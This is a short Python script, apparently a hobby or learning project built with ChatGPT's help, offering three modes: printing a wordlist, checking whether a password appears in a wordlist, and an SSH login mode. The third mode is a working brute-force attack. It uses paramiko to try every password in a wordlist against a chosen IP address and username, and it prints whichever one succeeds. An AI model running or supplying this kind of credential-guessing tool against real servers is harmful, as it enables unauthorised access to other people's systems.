import time
import paramiko

# W/ ChatGPT Assistance


# Prompt the user to select the mode
print("Select mode:")
print("1. Offensive; Dict. Iterator")
print("2. Defensive; Psw. Recognized")
print("3. SSH Authentication")
mode = input("Enter mode number (1, 2, or 3): ")

# If the user selects mode 1
if mode == '1':
    word_list_file = input("Enter word list file path: ")
    # Open the word list file and iterate through each word
    with open(word_list_file, 'r') as f:
        for word in f:
            word = word.strip()  # Remove any whitespace
            print(word)  # Print the word to the console
            time.sleep(0.5)  # Pause for half a second before moving to the next word

# If the user selects mode 2
elif mode == '2':
    password = input("Enter password: ")
    word_list_file = input("Enter word list file path: ")
    # Open the word list file and read all lines into a list
    with open(word_list_file, 'r') as f:
        word_list = [line.strip() for line in f]
        # Check if the provided password is in the word list
        if password in word_list:
            print("Password has been recognized.")
        else:
            print("Password was not recognized.")

# If the user selects mode 3
elif mode == '3':
    ip_address = input("Enter IP address: ")
    username = input("Enter username: ")
    word_list_file = input("Enter the word list file path: ")
    # Open the word list file and iterate through each password
    with open(word_list_file, 'r') as f:
        for password in f:
            password = password.strip()  # Remove any whitespace
            # Try to authenticate to the SSH server using the current password
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(ip_address, username=username, password=password)
                # If authentication is successful, print a success message and break out of the loop
                print(f"Login successful! Password: {password}")
                break
            except paramiko.AuthenticationException:
                # If authentication fails, print a message indicating the password was not successful
                print(f"Login failed for password: {password}")

# If the user selects an invalid mode
else:
    print("Invalid mode selected.")
